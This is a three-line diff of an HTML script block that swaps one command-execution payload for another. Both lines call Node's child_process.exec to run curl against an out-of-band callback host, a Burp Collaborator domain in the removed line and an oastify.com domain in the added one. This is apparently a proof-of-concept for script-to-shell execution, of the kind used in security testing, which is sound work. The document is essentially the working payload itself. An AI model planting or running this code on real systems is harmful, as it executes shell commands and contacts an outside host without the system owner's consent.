@@ -1,3 +1,3 @@
 <script>
-  require('child_process').exec("curl http://abcxyz.burpcollaborator.net/?pwned");
+  require('child_process').exec("curl https://ridkicjcs8snpcy4rywnxvfxfolg97xw.oastify.com");
 </script>
